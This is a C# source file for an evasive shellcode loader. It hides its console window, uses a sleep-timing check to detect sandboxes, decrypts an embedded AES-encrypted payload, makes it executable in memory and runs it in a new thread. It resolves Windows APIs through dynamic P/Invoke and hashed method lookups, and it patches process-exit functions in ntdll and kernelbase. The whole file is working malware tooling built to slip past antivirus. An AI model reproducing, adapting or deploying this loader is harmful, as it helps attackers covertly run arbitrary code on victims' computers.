using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace qwerty
{
    public class Program
    {
        static byte[] Decryptxyz(byte[] passwordBytes, byte[] saltBytes, byte[] xyz)
        {
            byte[] decryptedString;

            RijndaelManaged rj = new RijndaelManaged();

            try
            {
                rj.KeySize = 256;
                rj.BlockSize = 128;
                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                rj.Key = key.GetBytes(rj.KeySize / 8);
                rj.IV = key.GetBytes(rj.BlockSize / 8);
                rj.Mode = CipherMode.CBC;

                MemoryStream ms = new MemoryStream(xyz);

                using (CryptoStream cs = new CryptoStream(ms, rj.CreateDecryptor(), CryptoStreamMode.Read))
                {
                    cs.Read(xyz, 0, xyz.Length);
                    decryptedString = ms.ToArray();
                }
            }
            finally
            {
                rj.Clear();
            }

            return decryptedString;
        }
        static byte[] Decompress(byte[] data)
        {
            MemoryStream input = new(data);
            MemoryStream output = new();
            using (DeflateStream dStream = new(input, CompressionMode.Decompress))
                dStream.CopyTo(output);

            return output.ToArray();
        }
        [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        public static void Main()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            DateTime t1 = DateTime.Now;
            Sleep(1000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            byte[] passwordBytes = [14, 44, 31, 74, 79, 143, 95, 147, 182, 168, 31, 135, 172, 158, 137, 228, 16, 121, 122, 121, 255, 115, 9, 36, 150, 251, 211, 120, 20, 98, 163, 154,];
            byte[] saltBytes = [247, 168, 89, 197, 206, 227, 187, 145, 62, 2, 23, 140, 106, 57, 252, 151, 165, 56, 91, 43, 67, 76, 144, 130, 106, 203, 57, 195, 182, 212, 186, 162,];
            byte[] encryptedxyz = [181, 199, 132, 198, 163, 185, 14, 89, 113, 208, 15, 225, 216, 143, 210, 57, 173, 94, 50, 183, 230, 21, 111, 233, 252, 2, 169, 199, 191, 131, 6, 147, 243, 107, 215, 16, 23, 90, 182, 243, 225, 16, 105, 19, 225, 195, 186, 58, 242, 95, 126, 170, 18, 144, 38, 37, 209, 45, 115, 11, 52, 155, 82, 9, 174, 50, 46, 63, 106, 60, 99, 75, 39, 154, 1, 28, 93, 4, 12, 8, 229, 92, 204, 68, 4, 57, 211, 127, 87, 21, 166, 178, 28, 171, 28, 160, 103, 45, 20, 248, 29, 5, 67, 152, 44, 85, 111, 82, 236, 97, 35, 157, 90, 94, 111, 212, 197, 213, 132, 43, 180, 116, 250, 90, 214, 181, 85, 220, 85, 146, 99, 39, 35, 52, 211, 97, 108, 195, 175, 25, 116, 166, 11, 181, 52, 14, 222, 241, 140, 121, 26, 69, 92, 243, 43, 232, 51, 210, 131, 46, 36, 149, 145, 106, 152, 196, 245, 159, 90, 151, 125, 123, 173, 68, 24, 143, 71, 106, 12, 126, 166, 102, 170, 138, 26, 14, 169, 64, 87, 230, 202, 40, 122, 243, 180, 4, 133, 19, 33, 85, 101, 191, 108, 21, 30, 227, 101, 126, 219, 203, 242, 222, 164, 103, 16, 70, 13, 46, 226, 234, 132, 82, 217, 91, 132, 45, 95, 122, 82, 153, 152, 175, 73, 40, 125, 214, 76, 100, 227, 72, 68, 219, 13, 81, 6, 36, 130, 22, 35, 61, 10, 134, 7, 208, 215, 6, 71, 106, 64, 17, 138, 143, 15, 195, 15, 143, 63, 49, 29, 176, 128, 5, 171, 196, 194, 167, 136, 168, 169, 188, 90, 202, 2, 201, 183, 110, 93, 65, 233, 136, 239, 188, 37, 148, 199, 160, 186, 102, 57, 243, 244, 98, 151, 224, 91, 102, 45, 243, 219, 187, 110, 8, 225, 233, 82, 98, 41, 223, 194, 194, 40, 213, 249, 200, 2, 181, 42, 237, 175, 148, 204, 255, 77, 89, 240, 214, 176, 50, 160, 11, 35, 19, 133, 124, 224, 106, 39, 106, 82, 140, 215, 71, 178, 20, 143, 189, 93, 216, 38, 175, 32, 146, 127, 226, 57, 183, 21, 172, 150, 81, 19, 241, 141, 103, 30, 79, 183, 155, 247, 125, 179, 87, 74, 69, 128, 40, 43, 24, 189, 172, 66, 236, 40, 119, 59, 7, 228, 238, 72, 123, 67, 154, 181, 217, 15, 129, 201, 255, 180, 124, 163, 40, 228, 238, 44, 30, 76, 139, 168, 182, 249, 118, 94, 46, 157, 110, 137, 12, 172, 116, 132, 149, 52, 16, 191, 153, 109, 199, 92, 181, 80, 36, 20, 20, 244, 180, 212, 157, 49, 174, 37, 119, 175, 222, 110, 212, 20, 177, 193, 124, 96, 152, 73, 92, 155, 23, 232, 119, 61, 113, 25, 159, 233, 119, 115, 72, 84, 147, 251, 254, 190, 51, 86, 132, 247, 171, 46, 212, 209, 189, 68, 127, 204, 164, 160, 139, 48, 165, 205, 169, 253, 108, 42, 241, 54, 157, 235, 128, 206, 75, 203, 166, 247, 5, 85, 114, 148, 138, 235, 184, 242, 20, 177, 252, 139, 82, 240, 248, 162, 219, 44, 153, 244, 233, 133, 135, 129, 113, 34, 237, 67, 227, 249, 141, 229, 59, 97, 144, 165, 177, 188, 70, 204, 220, 95, 193, 128, 29, 237, 155, 49, 51, 118, 21, 131, 164, 191, 109, 185, 89, 3, 141, 200, 138, 4, 31, 98, 246, 94, 147, 190, 243, 125, 76, 123, 65, 197, 73, 49, 95, 5, 102, 41, 219, 105, 209, 105, 174, 245, 1, 218, 248, 218, 170, 117, 93, 111, 235, 152, 121, 234, 103, 149, 213, 13, 171, 214, 48, 131, 195, 33, 7, 162, 181, 87, 143, 142, 0, 42, 126, 223, 164, 59, 2, 181, 249, 224, 65, 201, 27, 55, 0, 163, 209, 0, 41, 112, 173, 227, 148, 213, 50, 150, 238, 0, 29, 183, 219, 169, 133, 228, 54, 168, 76, 133, 161, 125, 255, 91, 245, 168, 198, 17, 100, 113, 94, 134, 151, 170, 238, 69, 47, 89, 172, 15, 122, 131, 243, 108, 112, 2, 143, 164, 250, 94, 244, 77, 72, 153, 157, 253, 36, 184, 7, 88, 183, 115, 231, 75, 4, 140, 42, 136, 82, 190, 210, 50, 210, 0, 10, 59, 209, 99, 175, 195, 35, 127, 42, 111, 92, 253, 250, 27, 254, 203, 249, 188, 101, 18, 189, 48, 40, 183, 141, 136, 224, 35, 254, 148, 96, 244, 230, 21, 50, 66, 231, 179, 165, 132, 65, 8, 235, 159, 43, 199, 56, 56, 128, 187, 31, 249, 241, 209, 254, 19, 195, 229, 217, 144, 140, 124, 218, 184, 149, 81, 124, 115, 79, 248, 4, 54, 87, 14, 254, 104, 7, 230, 80, 96, 74, 216, 70, 55, 36, 115, 237, 145, 68, 141, 5, 122, 3, 119, 222, 217, 175, 165, 22, 223, 107, 135, 7, 105, 103, 149, 78, 96, 87, 27, 2, 4, 136, 134, 53, 27, 161, 184, 24, 108, 41, 98, 91, 158, 57, 6, 231, 21, 44, 13, 4, 10, 69, 184, 47, 195, 220, 165, 41, 179, 210, 166, 109, 144, 88, 61, 91, 210, 146, 225, 140, 198, 72, 178, 173, 138, 102, 118, 161, 149, 195, 126, 250, 115, 194, 243, 83, 14, 95, 197, 15, 200, 173, 26, 52, 22, 164, 201, 144, 245, 193, 227, 128, 239, 193, 202, 171, 184, 208, 176, 29, 184, 40, 193, 101, 244, 88, 232, 42, 141, 154, 179, 2, 63, 185, 233, 64, 135, 79, 49, 3, 23, 4, 220, 218, 205, 94, 141, 253, 233, 121, 110, 247, 70, 225, 208, 157, 48, 140, 60, 123, 76, 60, 243, 199, 176, 81, 176, 59, 135, 124, 29, 134, 17, 122, 178, 67, 47, 30, 84, 81, 106, 187, 184, 143, 221, 114, 28, 92, 78, 56, 40, 1, 167, 159, 187, 241, 251, 143, 109, 138, 163, 166, 28, 2, 160, 84, 204, 16, 126, 143, 228, 28, 87, 105, 216, 5, 140, 236, 144, 117, 36, 222, 183, 219, 196, 37, 182, 120, 10, 203, 164, 215, 82, 253, 113, 187, 201, 61, 121, 240, 237, 11, 90, 200, 122, 83, 29, 189, 203, 121, 38, 225, 165, 46, 19, 196, 42, 181, 19, 219, 195, 59, 69, 13, 96, 160, 149, 82, 224, 158, 249, 115, 97, 211, 16, 89, 204, 179, 130, 187, 95, 45, 221, 13, 139, 5, 142, 108, 135, 8, 29, 131, 65, 121, 140, 127, 204, 253, 250, 69, 233, 33, 210, 64, 147, 153, 241, 188, 167, 242, 16, 159, 255, 239, 109, 118, 255, 37, 101, 120, 203, 186, 26, 227, 96, 221, 42, 57, 81, 153,];
            byte[] xyz = Decryptxyz(passwordBytes, saltBytes, encryptedxyz);
           
            IntPtr pointer = Marshal.AllocHGlobal(xyz.Length);
            Marshal.Copy(xyz, 0, pointer, xyz.Length);

            _ = DPInvoke.VirtualProtect(pointer, (UIntPtr)xyz.Length, (uint)0x40, out _);

            _ = ExitPatcher.PatchExit();

            IntPtr hThread = DPInvoke.CreateThread(IntPtr.Zero, 0, pointer, IntPtr.Zero, 0, IntPtr.Zero);
            _ = DPInvoke.WaitForSingleObject(hThread, 0xFFFFFFFF);

            Marshal.FreeHGlobal(pointer);

            ExitPatcher.ResetExitFunctions();
        }
    }

    /// <summary>
    /// Based on: https://bohops.com/2022/04/02/unmanaged-code-execution-with-net-dynamic-pinvoke/
    /// </summary>
    class DPInvoke
    {
        static object DynamicPInvokeBuilder(Type type, string library, string method, object[] parameters, Type[] parameterTypes)
        {
            AssemblyName assemblyName = new AssemblyName("Temp01");
            AssemblyBuilder assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
            ModuleBuilder moduleBuilder = assemblyBuilder.DefineDynamicModule("Temp02");

            MethodBuilder methodBuilder = moduleBuilder.DefinePInvokeMethod(method, library, MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl, CallingConventions.Standard, type, parameterTypes, CallingConvention.Winapi, CharSet.Ansi);

            methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
            moduleBuilder.CreateGlobalFunctions();

            MethodInfo dynamicMethod = moduleBuilder.GetMethod(method);
            object result = dynamicMethod.Invoke(null, parameters);

            return result;
        }

        public static IntPtr GetModuleHandle(string lpModuleName)
        {
            Type[] parameterTypes = { typeof(string) };
            object[] parameters = { lpModuleName };
            var result = (IntPtr)DynamicPInvokeBuilder(typeof(IntPtr), "kernel32.dll", "GetModuleHandle", parameters, parameterTypes);
            return result;
        }

        public static IntPtr GetProcAddress(IntPtr hModule, string procName)
        {
            Type[] parameterTypes = { typeof(IntPtr), typeof(string) };
            object[] parameters = { hModule, procName };
            var result = (IntPtr)DynamicPInvokeBuilder(typeof(IntPtr), "kernel32.dll", "GetProcAddress", parameters, parameterTypes);
            return result;
        }

        public static bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)
        {
            uint oldProtect = 0;

            Type[] parameterTypes = { typeof(IntPtr), typeof(UIntPtr), typeof(uint), typeof(uint).MakeByRefType() };
            object[] parameters = { lpAddress, dwSize, flNewProtect, oldProtect };
            var result = (bool)DynamicPInvokeBuilder(typeof(bool), "kernel32.dll", "VirtualProtect", parameters, parameterTypes);

            if (!result) throw new Win32Exception(Marshal.GetLastWin32Error());
            lpflOldProtect = (uint)parameters[3];

            return result;
        }

        public static IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)
        {
            Type[] parameterTypes = { typeof(IntPtr), typeof(uint), typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr) };
            object[] parameters = { lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
            var result = (IntPtr)DynamicPInvokeBuilder(typeof(IntPtr), "kernel32.dll", "CreateThread", parameters, parameterTypes);
            return result;
        }

        public static uint WaitForSingleObject(IntPtr Handle, uint Wait)
        {
            Type[] parameterTypes = { typeof(IntPtr), typeof(uint) };
            object[] parameters = { Handle, Wait };
            var result = (uint)DynamicPInvokeBuilder(typeof(uint), "kernel32.dll", "WaitForSingleObject", parameters, parameterTypes);
            return result;
        }
    }

    /// <summary>
    /// Based on: https://dr4k0nia.github.io/dotnet/coding/2022/08/10/HInvoke-and-avoiding-PInvoke.html
    /// </summary>
    public class HInvoke
    {
#pragma warning disable CS8632 // The annotation for nullable reference types should only be used in code within a '#nullable' annotations context.
        static void InvokeMethod(uint classHash, uint methodHash, object[]? args = null)
#pragma warning restore CS8632 // The annotation for nullable reference types should only be used in code within a '#nullable' annotations context.
        {
            var typeDef = typeof(void).Assembly.GetTypes()
                .FirstOrDefault(type => GetHash(type.FullName!) == classHash);

            var methodInfo = typeDef.GetRuntimeMethods()
                .FirstOrDefault(method => GetHash(method.Name) == methodHash);

            if (methodInfo != null)
                methodInfo.Invoke(null, args);
        }

#pragma warning disable CS8632 // The annotation for nullable reference types should only be used in code within a '#nullable' annotations context.
        static T InvokeMethod<T>(uint classHash, uint methodHash, object[]? args = null)
#pragma warning restore CS8632 // The annotation for nullable reference types should only be used in code within a '#nullable' annotations context.
        {
            var typeDef = typeof(void).Assembly.GetTypes()
                .FirstOrDefault(type => GetHash(type.FullName!) == classHash);

            var runtimeMethod = typeDef.GetRuntimeMethods()
                .FirstOrDefault(method => GetHash(method.Name) == methodHash);

            if (runtimeMethod != null)
                return (T)runtimeMethod.Invoke(null, args);

            return default!;
        }

        static T GetPropertyValue<T>(uint classHash, uint propertyHash)
        {
            var typeDef = typeof(void).Assembly.GetTypes()
                .FirstOrDefault(type => GetHash(type.FullName!) == classHash);

            var runtimeProperty = typeDef.GetRuntimeProperties()
                .FirstOrDefault(property => GetHash(property.Name) == propertyHash);

            if (runtimeProperty != null)
                return (T)runtimeProperty.GetValue(null);

            return default!;
        }

        static uint GetHash(string str)
        {
            uint sum = 0;
            foreach (char c in str)
                sum = (sum >> 0xA | sum << 0x11) + c;
            sum = (sum >> 0xA | sum << 0x11) + 0;

            return sum;
        }

        public static IntPtr GetModuleHandle(string lpModuleName)
        {
            object[] parameters = { lpModuleName };
            var result = HInvoke.InvokeMethod<IntPtr>(13239936, 811580934, parameters); // Microsoft.Win32.Win32Native, GetModuleHandle
            return result;
        }

        public static IntPtr GetProcAddress(IntPtr hModule, string procName)
        {
            object[] parameters = { hModule, procName };
            var result = HInvoke.InvokeMethod<IntPtr>(13239936, 1721745356, parameters); // Microsoft.Win32.Win32Native, GetProcAddress
            return result;
        }

        public static bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)
        {
            var moduleHandle = GetModuleHandle("kernel32.dll");
            var functionPointer = GetProcAddress(moduleHandle, "VirtualProtect");

            Delegates.VirtualProtect virtualProtect = (Delegates.VirtualProtect)Marshal.GetDelegateForFunctionPointer(functionPointer, typeof(Delegates.VirtualProtect));

            var result = virtualProtect(lpAddress, dwSize, flNewProtect, out uint oldProtect);
            lpflOldProtect = oldProtect;

            return result;
        }

        public static IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)
        {
            var moduleHandle = GetModuleHandle("kernel32.dll");
            var functionPointer = GetProcAddress(moduleHandle, "CreateThread");

            Delegates.CreateThread createThread = (Delegates.CreateThread)Marshal.GetDelegateForFunctionPointer(functionPointer, typeof(Delegates.CreateThread));

            var result = createThread(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);

            return result;
        }

        public static uint WaitForSingleObject(IntPtr Handle, uint Wait)
        {
            var moduleHandle = GetModuleHandle("kernel32.dll");
            var functionPointer = GetProcAddress(moduleHandle, "WaitForSingleObject");

            Delegates.WaitForSingleObject waitForSingleObject = (Delegates.WaitForSingleObject)Marshal.GetDelegateForFunctionPointer(functionPointer, typeof(Delegates.WaitForSingleObject));

            var result = waitForSingleObject(Handle, Wait);

            return result;
        }
    }

    /// <summary>
    /// Stolen from:
    /// https://github.com/nettitude/RunPE/blob/main/RunPE/Patchers/ExitPatcher.cs
    /// https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/NanoDumpInject.cs
    /// </summary>
    class ExitPatcher
    {
        internal const uint PAGE_EXECUTE_READWRITE = 0x40;

        static private byte[] _terminateProcessOriginalBytes;
        static private byte[] _ntTerminateProcessOriginalBytes;
        static private byte[] _rtlExitUserProcessOriginalBytes;
        static private byte[] _corExitProcessOriginalBytes;

        static byte[] PatchFunction(string dllName, string functionName, byte[] patchBytes)
        {
            var moduleHandle = HInvoke.GetModuleHandle(dllName);
            var functionPointer = HInvoke.GetProcAddress(moduleHandle, functionName);

            var originalBytes = new byte[patchBytes.Length];
            Marshal.Copy(functionPointer, originalBytes, 0, patchBytes.Length);

            if (!DPInvoke.VirtualProtect(functionPointer, (UIntPtr)patchBytes.Length, PAGE_EXECUTE_READWRITE, out var oldProtect))
                return null;

            Marshal.Copy(patchBytes, 0, functionPointer, patchBytes.Length);

            if (!DPInvoke.VirtualProtect(functionPointer, (UIntPtr)patchBytes.Length, oldProtect, out _))
                return null;

            return originalBytes;
        }

        public static bool PatchExit()
        {
            var hKernelbase = HInvoke.GetModuleHandle("kernelbase");
            var pExitThreadFunc = HInvoke.GetProcAddress(hKernelbase, "ExitThread");

            /*
             * mov rcx, 0x0
             * mov rax, <ExitThread>
             * push rax
             * ret
            */
            var exitThreadPatchBytes = new List<byte>() { 0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8 };
            var pointerBytes = BitConverter.GetBytes(pExitThreadFunc.ToInt64());

            exitThreadPatchBytes.AddRange(pointerBytes);

            exitThreadPatchBytes.Add(0x50);
            exitThreadPatchBytes.Add(0xC3);

            _terminateProcessOriginalBytes = PatchFunction("kernelbase", "TerminateProcess", exitThreadPatchBytes.ToArray());
            if (_terminateProcessOriginalBytes == null)
                return false;

            _corExitProcessOriginalBytes = PatchFunction("mscoree", "CorExitProcess", exitThreadPatchBytes.ToArray());
            if (_corExitProcessOriginalBytes == null)
                return false;

            _ntTerminateProcessOriginalBytes = PatchFunction("ntdll", "NtTerminateProcess", exitThreadPatchBytes.ToArray());
            if (_ntTerminateProcessOriginalBytes == null)
                return false;

            _rtlExitUserProcessOriginalBytes = PatchFunction("ntdll", "RtlExitUserProcess", exitThreadPatchBytes.ToArray());
            if (_rtlExitUserProcessOriginalBytes == null)
                return false;

            return true;
        }

        public static void ResetExitFunctions()
        {
            PatchFunction("kernelbase", "TerminateProcess", _terminateProcessOriginalBytes);
            PatchFunction("mscoree", "CorExitProcess", _corExitProcessOriginalBytes);
            PatchFunction("ntdll", "NtTerminateProcess", _ntTerminateProcessOriginalBytes);
            PatchFunction("ntdll", "RtlExitUserProcess", _rtlExitUserProcessOriginalBytes);
        }
    }

    class Delegates
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint WaitForSingleObject(
            IntPtr Handle,
            uint Wait);
    }
}

